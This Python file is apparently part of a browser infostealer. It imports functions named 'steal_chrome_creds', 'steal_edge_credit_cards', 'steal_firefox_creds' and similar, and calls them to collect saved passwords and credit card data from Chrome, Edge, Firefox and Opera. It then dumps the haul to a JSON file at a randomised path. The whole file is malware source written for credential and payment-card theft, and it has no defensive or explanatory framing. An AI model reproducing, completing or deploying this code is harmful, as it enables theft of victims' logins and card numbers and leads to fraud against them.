import json
from features.browsers.chrome import steal_chrome_creds, steal_chrome_credit_cards
from features.browsers.edge import steal_edge_creds, steal_edge_credit_cards
from features.browsers.firefox import steal_firefox_creds
from features.browsers.opera import steal_opera_creds, steal_opera_credit_cards
from features.func import generate_random_filename, generate_random_path


def get_browesers_data():
    browser_data = {
        'chrome': {
            'creds': steal_chrome_creds(),
            'credit_cards': steal_chrome_credit_cards()
        },
        'edge': {
            'creds': steal_edge_creds(),
            'credit_cards': steal_edge_credit_cards()
        },
        'firefox': {
            'creds': steal_firefox_creds()
        },
        'opera': {
            'creds': steal_opera_creds(),
            'credit_cards': steal_opera_credit_cards()
        }
    }

    random_path = generate_random_path() + generate_random_filename() + ".json"
    print(f"Browser data path: {random_path}")

    with open(random_path, 'w') as f:
        json.dump(browser_data, f)

    return random_path
    